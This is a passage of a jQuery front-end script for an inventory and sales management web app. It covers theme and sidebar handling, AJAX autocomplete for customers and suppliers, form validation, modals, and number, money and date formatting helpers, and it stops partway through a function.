$(window).load(function () {
    $("#loading").fadeOut("slow");
});
function cssStyle() {
    if ($.cookie('sma_style') == 'light') {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').remove();
        $('<link>')
                .appendTo('head')
                .attr({type: 'text/css', rel: 'stylesheet'})
                .attr('href', site.base_url + 'themes/default/assets/styles/light.css');
    } else if ($.cookie('sma_style') == 'blue') {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').remove();
        $('<link>')
                .appendTo('head')
                .attr({type: 'text/css', rel: 'stylesheet'})
                .attr('href', '' + site.base_url + 'themes/default/assets/styles/blue.css');
    } else {
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').attr('disabled', 'disabled');
        $('link[href="' + site.base_url + 'themes/default/assets/styles/light.css"]').remove();
        $('link[href="' + site.base_url + 'themes/default/assets/styles/blue.css"]').remove();
    }

    if ($('#sidebar-left').hasClass('minified')) {
        $.cookie('sma_theme_fixed', 'no', {path: '/'});
        $('#content, #sidebar-left, #header').removeAttr("style");
        $('#sidebar-left').removeClass('sidebar-fixed');
        $('#content').removeClass('content-with-fixed');
        $('#fixedText').text('Fixed');
        $('#main-menu-act').addClass('full visible-md visible-lg').show();
        $('#fixed').removeClass('fixed');
    } else {
        if (site.settings.rtl == 1) {
            $.cookie('sma_theme_fixed', 'no', {path: '/'});
        }
        if ($.cookie('sma_theme_fixed') == 'yes') {
            // $('#content').css('margin-left', $('#sidebar-left').outerWidth(true)).css('margin-top', '40px');
            $('#content').addClass('content-with-fixed');
            $('#sidebar-left').addClass('sidebar-fixed').css('height', $(window).height() - 80);
            $('#header').css('position', 'fixed').css('top', '0').css('width', '100%');
            $('#fixedText').text('Static');
            $('#main-menu-act').removeAttr("class").hide();
            $('#fixed').addClass('fixed');
            $("#sidebar-left").css("overflow", "hidden");
            $('#sidebar-left').perfectScrollbar({suppressScrollX: true});
        } else {
            $('#content, #sidebar-left, #header').removeAttr("style");
            $('#sidebar-left').removeClass('sidebar-fixed');
            $('#content').removeClass('content-with-fixed');
            $('#fixedText').text('Fixed');
            $('#main-menu-act').addClass('full visible-md visible-lg').show();
            $('#fixed').removeClass('fixed');
            $('#sidebar-left').perfectScrollbar('destroy');
        }
    }
    widthFunctions();
}
$('#csv_file').change(function (e) {
    v = $(this).val();
    if (v != '') {
        var validExts = new Array(".xlsx");
        var fileExt = v;
        fileExt = fileExt.substring(fileExt.lastIndexOf('.'));
        if (validExts.indexOf(fileExt) < 0) {
            e.preventDefault();
            bootbox.alert("Invalid file selected. Only .xlsx file is allowed.");
            $(this).val('');
            $(this).fileinput('clear');
            $('form[data-toggle="validator"]').bootstrapValidator('updateStatus', 'csv_file', 'NOT_VALIDATED');
            return false;
        } else
            return true;
    }
});

$(document).ready(function () {
    // $('.form-control').attr('autocomplete', 'off');
    $("#suggest_product").autocomplete({
        source: site.base_url + 'reports/suggestions',
        select: function (event, ui) {
            $('#report_product_id').val(ui.item.id);
        },
        minLength: 1,
        autoFocus: false,
        delay: 250,
        response: function (event, ui) {
            if (ui.content != null) {
                if (ui.content.length == 1 && ui.content[0].id != 0) {
                    ui.item = ui.content[0];
                    $(this).val(ui.item.label);
                    $(this).data('ui-autocomplete')._trigger('select', 'autocompleteselect', ui);
                    $(this).autocomplete('close');
                    $(this).removeClass('ui-autocomplete-loading');
                }
            } else {
                bootbox.alert("Product name not found.");
                $('#suggest_product').val('');
            }
        },
    });
    $(document).on('blur', '#suggest_product', function (e) {
        if (!$(this).val()) {
            $('#report_product_id').val('');
        }
    });
    $('#random_num').click(function () {
        $(this).parent('.input-group').children('input').val(generateCardNo(8));
    });
    $('#toogle-customer-read-attr').click(function () {
        var icus = $(this).closest('.input-group').find("input[name='customer']");
        var nst = icus.is('[readonly]') ? false : true;
        icus.select2("readonly", nst);
        return false;
    });
    $('.top-menu-scroll').perfectScrollbar();
    $('#fixed').click(function (e) {
        e.preventDefault();
        if ($('#sidebar-left').hasClass('minified')) {
            bootbox.alert('Unable to fix minified sidebar');
        } else {
            if ($(this).hasClass('fixed')) {
                $.cookie('sma_theme_fixed', 'no', {path: '/'});
            } else {
                $.cookie('sma_theme_fixed', 'yes', {path: '/'});
            }
            cssStyle();
        }
    });
    //$('.form-control').attr('autocomplete', 'off'); 
    $('form').attr('autocomplete', 'off');
});

function widthFunctions(e) {
    var l = $("#sidebar-left").outerHeight(true),
            c = $("#content").height(),
            co = $("#content").outerHeight(),
            h = $("header").height(),
            f = $("footer").height(),
            wh = $(window).height(),
            ww = $(window).width();
    if (ww < 992) {
        $("#main-menu-act").removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified")
        if ($.cookie('sma_theme_fixed') == 'yes') {
            $.cookie('sma_theme_fixed', 'no', {path: '/'});
            $('#content, #sidebar-left, #header').removeAttr("style");
            $("#sidebar-left").css("overflow-y", "visible");
            $('#fixedText').text('Fixed');
            $('#main-menu-act').addClass('full visible-md visible-lg').show();
            $('#fixed').removeClass('fixed');
            $('#sidebar-left').perfectScrollbar('destroy');
        }
    }
    if (ww < 998 && ww > 750) {
        $('#main-menu-act').hide();
        $("body").addClass("sidebar-minified");
        $("#content").addClass("sidebar-minified");
        $("#sidebar-left").addClass("minified");
        $(".dropmenu > .chevron").removeClass("opened").addClass("closed");
        $(".dropmenu").parent().find("ul").hide();
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        $("#sidebar-left > div > ul > li > a").addClass("open");
        $('#fixed').hide();
    }
    if (ww > 1024 && $.cookie('sma_sidebar') != 'minified') {
        $('#main-menu-act').removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified");
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
        $("#sidebar-left > div > ul > li > a").removeClass("open");
        $('#fixed').show();
    }
    if ($.cookie('sma_theme_fixed') == 'yes') {
        $('#content').addClass('content-with-fixed');
        $('#sidebar-left').addClass('sidebar-fixed').css('height', $(window).height() - 80);
    }
    if (ww > 767) {
        wh - 80 > l && $("#sidebar-left").css("min-height", wh - h - f - 30);
        wh - 80 > c && $("#content").css("min-height", wh - h - f - 30);
    } else {
        $("#sidebar-left").css("min-height", "0px");
        $(".content-con").css("max-width", ww);
    }
    //$(window).scrollTop($(window).scrollTop() + 1);
}

jQuery(document).ready(function (e) {
    window.location.hash ? e('#myTab a[href="' + window.location.hash + '"]').tab('show') : e("#myTab a:first").tab("show");
    e("#myTab2 a:first, #dbTab a:first").tab("show");
    e("#myTab a, #myTab2 a, #dbTab a").click(function (t) {
        t.preventDefault();
        e(this).tab("show");
    });
    e('[rel="popover"],[data-rel="popover"],[data-toggle="popover"]').popover();
    e("#toggle-fullscreen").button().click(function () {
        var t = e(this),
                n = document.documentElement;
        if (!t.hasClass("active")) {
            e("#thumbnails").addClass("modal-fullscreen");
            n.webkitRequestFullScreen ? n.webkitRequestFullScreen(window.Element.ALLOW_KEYBOARD_INPUT) : n.mozRequestFullScreen && n.mozRequestFullScreen()
        } else {
            e("#thumbnails").removeClass("modal-fullscreen");
            (document.webkitCancelFullScreen || document.mozCancelFullScreen || e.noop).apply(document)
        }
    });
    e(".btn-close").click(function (t) {
        t.preventDefault();
        e(this).parent().parent().parent().fadeOut()
    });
    e(".btn-minimize").click(function (t) {
        t.preventDefault();
        var n = e(this).parent().parent().next(".box-content");
        n.is(":visible") ? e("i", e(this)).removeClass("fa-chevron-up").addClass("fa-chevron-down") : e("i", e(this)).removeClass("fa-chevron-down").addClass("fa-chevron-up");
        n.slideToggle("slow", function () {
            widthFunctions();
        })
    });
});

jQuery(document).ready(function (e) {
    e("#main-menu-act").click(function () {
        if (e(this).hasClass("full")) {
            $.cookie('sma_sidebar', 'minified', {path: '/'});
            e(this).removeClass("full").addClass("minified").find("i").removeClass("fa-angle-double-left").addClass("fa-angle-double-right");
            e("body").addClass("sidebar-minified");
            e("#content").addClass("sidebar-minified");
            e("#sidebar-left").addClass("minified");
            e(".dropmenu > .chevron").removeClass("opened").addClass("closed");
            e(".dropmenu").parent().find("ul").hide();
            e("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
            e("#sidebar-left > div > ul > li > a").addClass("open");
            $('#fixed').hide();
        } else {
            $.cookie('sma_sidebar', 'full', {path: '/'});
            e(this).removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
            e("body").removeClass("sidebar-minified");
            e("#content").removeClass("sidebar-minified");
            e("#sidebar-left").removeClass("minified");
            e("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
            e("#sidebar-left > div > ul > li > a").removeClass("open");
            $('#fixed').show();
        }
        return false;
    });
    e(".dropmenu").click(function (t) {
        t.preventDefault();
        if (e("#sidebar-left").hasClass("minified")) {
            if (!e(this).hasClass("open")) {
                e(this).parent().find("ul").first().slideToggle();
                e(this).find(".chevron").hasClass("closed") ? e(this).find(".chevron").removeClass("closed").addClass("opened") : e(this).find(".chevron").removeClass("opened").addClass("closed")
            }
        } else {
            e(this).parent().find("ul").first().slideToggle();
            e(this).find(".chevron").hasClass("closed") ? e(this).find(".chevron").removeClass("closed").addClass("opened") : e(this).find(".chevron").removeClass("opened").addClass("closed")
        }
    });
    if (e("#sidebar-left").hasClass("minified")) {
        e("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        e("#sidebar-left > div > ul > li > a").addClass("open");
        e("body").addClass("sidebar-minified")
    }
});

$(document).ready(function () {
    cssStyle();
    $('select, .select').select2({minimumResultsForSearch: 7});
    $('#customer, #rcustomer').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "customers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
    $('#supplier, #rsupplier, .rsupplier').select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "suppliers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
    $('.input-tip').tooltip({placement: 'top', html: true, trigger: 'hover focus', container: 'body',
        title: function () {
            return $(this).attr('data-tip');
        }
    });
    $('.input-pop').popover({placement: 'top', html: true, trigger: 'hover', container: 'body',
        content: function () {
            return $(this).attr('data-tip');
        },
        title: function () {
            return '<b>' + $('label[for="' + $(this).attr('id') + '"]').text() + '</b>';
        }
    });
});

$(document).on('click', '*[data-toggle="lightbox"]', function (event) {
    event.preventDefault();
    $(this).ekkoLightbox();
});
$(document).on('click', '*[data-toggle="popover"]', function (event) {
    event.preventDefault();
    $(this).popover();
});

$(document).ajaxStart(function () {
    $('#ajaxCall').show();
}).ajaxStop(function () {
    $('#ajaxCall').hide();
});

$(document).ready(function () {
    $('input[type="checkbox"],[type="radio"]').not('.skip').iCheck({
        checkboxClass: 'icheckbox_square-blue',
        radioClass: 'iradio_square-blue',
        increaseArea: '20%'
    });
    $('textarea').not('.skip').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'image', /*'video',*/ 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var editor = this.$editor.next('textarea');
            if ($(editor).attr('required')) {
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', $(editor).attr('name'));
            }
        }
    });
    $(document).on('click', '.file-caption', function () {
        $(this).next('.input-group-btn').children('.btn-file').children('input.file').trigger('click');
    });
});

function suppliers(ele) {
    $(ele).select2({
        minimumInputLength: 1,
        ajax: {
            url: site.base_url + "suppliers/suggestions",
            dataType: 'json',
            quietMillis: 15,
            data: function (term, page) {
                return {
                    term: term,
                    limit: 10
                };
            },
            results: function (data, page) {
                if (data.results != null) {
                    return {results: data.results};
                } else {
                    return {results: [{id: '', text: 'No Match Found'}]};
                }
            }
        }
    });
}

$(function () {
    $('.datetime').datetimepicker({format: site.dateFormats.js_ldate, fontAwesome: true, language: 'sma', weekStart: 1, todayBtn: 1, autoclose: 1, todayHighlight: 1, startView: 2, forceParse: 0});
    $('.date').datetimepicker({format: site.dateFormats.js_sdate, fontAwesome: true, language: 'sma', todayBtn: 1, autoclose: 1, minView: 2});
    $(document).on('focus', '.date', function (t) {
        $(this).datetimepicker({format: site.dateFormats.js_sdate, fontAwesome: true, todayBtn: 1, autoclose: 1, minView: 2});
    });
    $(document).on('focus', '.datetime', function () {
        $(this).datetimepicker({format: site.dateFormats.js_ldate, fontAwesome: true, weekStart: 1, todayBtn: 1, autoclose: 1, todayHighlight: 1, startView: 2, forceParse: 0});
    });
});

$(document).ready(function () {
    $('#dbTab a').on('shown.bs.tab', function (e) {
        var newt = $(e.target).attr('href');
        var oldt = $(e.relatedTarget).attr('href');
        $(oldt).hide();
        //$(newt).hide().fadeIn('slow');
        $(newt).hide().slideDown('slow');
    });
    $('.dropdown').on('show.bs.dropdown', function (e) {
        $(this).find('.dropdown-menu').first().stop(true, true).slideDown('fast');
    });
    $('.dropdown').on('hide.bs.dropdown', function (e) {
        $(this).find('.dropdown-menu').first().stop(true, true).slideUp('fast');
    });
    $('.hideComment').click(function () {
        $.ajax({url: site.base_url + 'welcome/hideNotification/' + $(this).attr('id')});
    });
    $('.tip').tooltip();
    $('body').on('click', '#delete', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form').submit();
    });
    $('body').on('click', '#sync_quantity', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#excel', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#pdf', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

     $('body').on('click', '#fav_products', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

    $('body').on('click', '#labelProducts', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#barcodeProducts', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
    $('body').on('click', '#combine', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

    $('body').on('click', '#combine_invoice', function (e) {
        e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });

     $('body').on('click', '#export_invoice_to_excel', function(e) {
         e.preventDefault();
        $('#form_action').val($(this).attr('data-action'));
        $('#action-form-submit').trigger('click');
    });
});

$(document).ready(function () {
    $('#product-search').click(function () {
        $('#product-search-form').submit();
    });
    //feedbackIcons:{valid: 'fa fa-check',invalid: 'fa fa-times',validating: 'fa fa-refresh'},
    $('form[data-toggle="validator"]').bootstrapValidator({message: 'Please enter/select a value', submitButtons: 'input[type="submit"]'});
    fields = $('.form-control');
    $.each(fields, function () {
        var id = $(this).attr('id');
        var iname = $(this).attr('name');
        var iid = '#' + id;
        if (!!$(this).attr('data-bv-notempty') || !!$(this).attr('required')) {
            $("label[for='" + id + "']").append(' *');
            $(document).on('change', iid, function () {
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', iname);
            });
        }
    });
    $('body').on('click', 'label', function (e) {
        var field_id = $(this).attr('for');
        if (field_id) {
            if ($("#" + field_id).hasClass('select')) {
                $("#" + field_id).select2("open");
                return false;
            }
        }
    });
    $('body').on('focus', 'select', function (e) {
        var field_id = $(this).attr('id');
        if (field_id) {
            if ($("#" + field_id).hasClass('select')) {
                $("#" + field_id).select2("open");
                return false;
            }
        }
    });
    $('#myModal').on('hidden.bs.modal', function () {
        $(this).find('.modal-dialog').empty();
        //$(this).find('#myModalLabel').empty().html('&nbsp;');
        //$(this).find('.modal-body').empty().text('Loading...');
        //$(this).find('.modal-footer').empty().html('&nbsp;');
        $(this).removeData('bs.modal');
    });
    $('#myModal2').on('hidden.bs.modal', function () {
        $(this).find('.modal-dialog').empty();
        //$(this).find('#myModalLabel').empty().html('&nbsp;');
        //$(this).find('.modal-body').empty().text('Loading...');
        //$(this).find('.modal-footer').empty().html('&nbsp;');
        $(this).removeData('bs.modal');
        $('#myModal').css('zIndex', '1050');
        $('#myModal').css('overflow-y', 'scroll');
    });
    $('#myModal2').on('show.bs.modal', function () {
        $('#myModal').css('zIndex', '1040');
    });
    $('.modal').on('show.bs.modal', function () {
        $('#modal-loading').show();
        $('.blackbg').css('zIndex', '1041');
        $('.loader').css('zIndex', '1042');
    }).on('hide.bs.modal', function () {
        $('#modal-loading').hide();
        $('.blackbg').css('zIndex', '3');
        $('.loader').css('zIndex', '4');
    });
    $(document).on('click', '.po', function (e) {
        e.preventDefault();
        $('.po').popover({html: true, placement: 'left', trigger: 'manual'}).popover('show').not(this).popover('hide');
        return false;
    });
    $(document).on('click', '.po-close', function () {
        $('.po').popover('hide');
        return false;
    });
    $(document).on('click', '.po-delete', function (e) {
        var row = $(this).closest('tr');
        e.preventDefault();
        $('.po').popover('hide');
        var link = $(this).attr('href');
        var return_id = $(this).attr('data-return-id');
        $.ajax({type: "get", url: link,
            success: function (data) {
                $('#' + return_id).remove();
                row.remove();
                if (data) {
                    addAlert(data, 'success');
                }
            },
            error: function (data) {
                addAlert('Failed', 'danger');
            }
        });
        return false;
    });
    $(document).on('click', '.po-delete1', function (e) {
        e.preventDefault();
        $('.po').popover('hide');
        var link = $(this).attr('href');
        var s = $(this).attr('id');
        var sp = s.split('__')
        $.ajax({type: "get", url: link,
            success: function (data) {
                if (data) {
                    addAlert(data, 'success');
                }
                $('#' + sp[1]).remove();
            },
            error: function (data) {
                addAlert('Failed', 'danger');
            }
        });
        return false;
    });
    $('body').on('click', '.bpo', function (e) {
        e.preventDefault();
        $(this).popover({html: true, trigger: 'manual'}).popover('toggle');
        return false;
    });
    $('body').on('click', '.bpo-close', function (e) {
        $('.bpo').popover('hide');
        return false;
    });
    $('#genNo').click(function () {
        var no = generateCardNo();
        $(this).parent().parent('.input-group').children('input').val(no);
        return false;
    });
    $('#inlineCalc').calculator({layout: ['_%+-CABS', '_7_8_9_/', '_4_5_6_*', '_1_2_3_-', '_0_._=_+'], showFormula: true});
    $('.calc').click(function (e) {
        e.stopPropagation();
    });
    $(document).on('click', '.sname', function (e) {
        var row = $(this).closest('tr');
        var itemid = row.find('.rid').val();
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + itemid});
        $('#myModal').modal('show');
    });
});

function addAlert(message, type) {
    $('.alerts-con').empty().append(
            '<div class="alert alert-' + type + '">' +
            '<button type="button" class="close" data-dismiss="alert">' +
            '&times;</button>' + message + '</div>');
}

$(document).ready(function () {
    if ($.cookie('sma_sidebar') == 'minified') {
        $('#main-menu-act').removeClass("full").addClass("minified").find("i").removeClass("fa-angle-double-left").addClass("fa-angle-double-right");
        $("body").addClass("sidebar-minified");
        $("#content").addClass("sidebar-minified");
        $("#sidebar-left").addClass("minified");
        $(".dropmenu > .chevron").removeClass("opened").addClass("closed");
        $(".dropmenu").parent().find("ul").hide();
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("closed").addClass("opened");
        $("#sidebar-left > div > ul > li > a").addClass("open");
        $('#fixed').hide();
    } else {

        $('#main-menu-act').removeClass("minified").addClass("full").find("i").removeClass("fa-angle-double-right").addClass("fa-angle-double-left");
        $("body").removeClass("sidebar-minified");
        $("#content").removeClass("sidebar-minified");
        $("#sidebar-left").removeClass("minified");
        $("#sidebar-left > div > ul > li > a > .chevron").removeClass("opened").addClass("closed");
        $("#sidebar-left > div > ul > li > a").removeClass("open");
        $('#fixed').show();
    }
});

$(document).ready(function () {
    $('#daterange').daterangepicker({
        timePicker: true,
        format: (site.dateFormats.js_sdate).toUpperCase() + ' HH:mm',
        ranges: {
            'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
            'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
            'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
            'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
        }
    },
            function (start, end) {
                refreshPage(start.format('YYYY-MM-DD HH:mm'), end.format('YYYY-MM-DD HH:mm'));
            });
});

function refreshPage(start, end) {
    window.location.replace(CURI + '/' + encodeURIComponent(start) + '/' + encodeURIComponent(end));
}

function retina() {
    retinaMode = window.devicePixelRatio > 1;
    return retinaMode
}

$(document).ready(function () {
    $('#cssLight').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'light', {path: '/'});
        cssStyle();
        return true;
    });
    $('#cssBlue').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'blue', {path: '/'});
        cssStyle();
        return true;
    });
    $('#cssBlack').click(function (e) {
        e.preventDefault();
        $.cookie('sma_style', 'black', {path: '/'});
        cssStyle();
        return true;
    });
    $("#toTop").click(function (e) {
        e.preventDefault();
        $("html, body").animate({scrollTop: 0}, 100);
    });
    $(document).on('click', '.delimg', function (e) {
        e.preventDefault();
        var ele = $(this), id = $(this).attr('data-item-id');
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result == true) {
                $.get(site.base_url + 'products/delete_image/' + id, function (data) {
                    if (data.error === 0) {
                        addAlert(data.msg, 'success');
                        ele.parent('.gallery-image').remove();
                    }
                });
            }
        });
        return false;
    });
});
$(document).ready(function () {
    $(document).on('click', '.row_status', function (e) {
        e.preventDefault;
        var row = $(this).closest('tr');
        var id = row.attr('id');
        if (row.hasClass('invoice_link')) {
            $('#myModal').modal({remote: site.base_url + 'sales/update_status/' + id});
            $('#myModal').modal('show');
        } else if (row.hasClass('purchase_link')) {
            $('#myModal').modal({remote: site.base_url + 'purchases/update_status/' + id});
            $('#myModal').modal('show');
        } else if (row.hasClass('quote_link')) {
            $('#myModal').modal({remote: site.base_url + 'quotes/update_status/' + id});
            $('#myModal').modal('show');
        } /*else if (row.hasClass('transfer_link')) {
            $('#myModal').modal({remote: site.base_url + 'transfers/update_status/' + id});
            $('#myModal').modal('show');
        }*/
        return false;
    });
});
/*
 $(window).scroll(function() {
 if ($(this).scrollTop()) {
 $('#toTop').fadeIn();
 } else {
 $('#toTop').fadeOut();
 }
 });
 */
$(document).on('ifChecked', '.checkth, .checkft', function (event) {
    $('.checkth, .checkft').iCheck('check');
    $('.multi-select').each(function () {
        $(this).iCheck('check');
    });
});
$(document).on('ifUnchecked', '.checkth, .checkft', function (event) {
    $('.checkth, .checkft').iCheck('uncheck');
    $('.multi-select').each(function () {
        $(this).iCheck('uncheck');
    });
});
$(document).on('ifUnchecked', '.multi-select', function (event) {
    $('.checkth, .checkft').attr('checked', false);
    $('.checkth, .checkft').iCheck('update');
});

function check_add_item_val() {
    $('#add_item').bind('keypress', function (e) {
        if (e.keyCode == 13 || e.keyCode == 9) {
            e.preventDefault();
            // $(this).autocomplete("search");
        }
    });
}
function fld(oObj) {
    if (oObj != null) {
        var aDate = oObj.split('-');
        var bDate = aDate[2].split(' ');
        year = aDate[0], month = aDate[1], day = bDate[0], time = bDate[1];
        if (site.dateFormats.js_sdate == 'dd-mm-yyyy')
            return day + "-" + month + "-" + year + " " + time;
        else if (site.dateFormats.js_sdate === 'dd/mm/yyyy')
            return day + "/" + month + "/" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'dd.mm.yyyy')
            return day + "." + month + "." + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm/dd/yyyy')
            return month + "/" + day + "/" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm-dd-yyyy')
            return month + "-" + day + "-" + year + " " + time;
        else if (site.dateFormats.js_sdate == 'mm.dd.yyyy')
            return month + "." + day + "." + year + " " + time;
        else
            return oObj;
    } else {
        return '';
    }
}

function fsd(oObj) {
    if (oObj != null) {
        var aDate = oObj.split('-');
        if (site.dateFormats.js_sdate == 'dd-mm-yyyy')
            return aDate[2] + "-" + aDate[1] + "-" + aDate[0];
        else if (site.dateFormats.js_sdate === 'dd/mm/yyyy')
            return aDate[2] + "/" + aDate[1] + "/" + aDate[0];
        else if (site.dateFormats.js_sdate == 'dd.mm.yyyy')
            return aDate[2] + "." + aDate[1] + "." + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm/dd/yyyy')
            return aDate[1] + "/" + aDate[2] + "/" + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm-dd-yyyy')
            return aDate[1] + "-" + aDate[2] + "-" + aDate[0];
        else if (site.dateFormats.js_sdate == 'mm.dd.yyyy')
            return aDate[1] + "." + aDate[2] + "." + aDate[0];
        else
            return oObj;
    } else {
        return '';
    }
}
function generateCardNo(x) {
    if (!x) {
        x = 16;
    }
    chars = "1234567890";
    no = "";
    for (var i = 0; i < x; i++) {
        var rnum = Math.floor(Math.random() * chars.length);
        no += chars.substring(rnum, rnum + 1);
    }
    return no;
}
function roundNumber(num, nearest) {
    if (!nearest) {
        nearest = 0.05;
    }
    return Math.round((num / nearest) * nearest);
}
function getNumber(x) {
    return accounting.unformat(x);
}
function formatQuantity(x) {
    return (x != null) ? '<div class="text-center">' + formatNumber(x, site.settings.qty_decimals) + '</div>' : '';
}
function formatQuantity2(x) {
    return (x != null) ? formatNumber(x, site.settings.qty_decimals) : '';
}
function formatNumber(x, d) {
    if (!d && d != 0) {
        d = site.settings.decimals;
    }
    if (site.settings.sac == 1) {
        return formatSA(parseFloat(x).toFixed(d));
    }
    return accounting.formatNumber(x, d, site.settings.thousands_sep == 0 ? ' ' : site.settings.thousands_sep, site.settings.decimals_sep);
}
function formatMoney(x, symbol) {
    if (!symbol) {
        symbol = "";
    }
    if (site.settings.sac == 1) {
        return (site.settings.display_symbol == 1 ? site.settings.symbol : '') +
                '' + (parseFloat(x).toFixed(site.settings.decimals)) +
                (site.settings.display_symbol == 2 ? site.settings.symbol : '');
    }
    var fmoney = accounting.formatMoney(x, symbol, site.settings.decimals, site.settings.thousands_sep == 0 ? ' ' : site.settings.thousands_sep, site.settings.decimals_sep, "%s%v");
    fmoney = (fmoney == '-0.00') ? '0.00' : fmoney; //convert -0.00 to 0.00
    return (site.settings.display_symbol == 1 ? site.settings.symbol : '') +
            fmoney +
            (site.settings.display_symbol == 2 ? site.settings.symbol : '');
}
function is_valid_discount(mixed_var) {
    return (is_numeric(mixed_var) || (/([0-9]%)/i.test(mixed_var))) ? true : false;
}
function is_numeric(mixed_var) {
    var whitespace =
            " \n\r\t\f\x0b\xa0\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u200b\u2028\u2029\u3000";
    return (typeof mixed_var === 'number' || (typeof mixed_var === 'string' && whitespace.indexOf(mixed_var.slice(-1)) === -
            1)) && mixed_var !== '' && !isNaN(mixed_var);
}
function is_float(mixed_var) {
    return +mixed_var === mixed_var && (!isFinite(mixed_var) || !!(mixed_var % 1));
}
function decimalFormat(x) {
    if (x != null) {
        return '<div class="text-center">' + formatNumber(x) + '</div>';
    } else {
        return '<div class="text-center">0</div>';
    }
}
function currencyFormat(x, format='') {
	if(format==''){
		if (x != null) {
			return '<div class="text-right">' + formatMoney(x) + '</div>';
		} else {
			return '<div class="text-right">0</div>';
		}
	}else{
		if (x != null) {
			return formatMoney(x);
		} else {
			return '0';
		}
	}
    
}
function formatDecimal(x, d) {
    if (!d) {
        d = site.settings.decimals;
    }
    return parseFloat(accounting.formatNumber(x, d, '', '.'));
}
function formatDecimals(x, d) {
    if (!d) {
        d = site.settings.decimals;
    }
    return parseFloat(accounting.formatNumber(x, d, '', '.')).toFixed(d);
}
function pqFormat(x) {
    if (x != null) {
        var d = '', pqc = x.split("___");
        for (index = 0; index < pqc.length; ++index) {
            var pq = pqc[index];
            var v = pq.split("__");
            d += v[0] + ' (' + formatQuantity2(v[1]) + ')<br>';
        }
        return d;
    } else {
        return '';
    }
}
function checkbox(x) {
    return '<div class="text-center"><input class="checkbox multi-select" type="checkbox" name="val[]" value="' + x + '" /></div>';
}
function decode_html(value) {
    return $('<div/>').html(value).text();
}
function img_hl(x) {
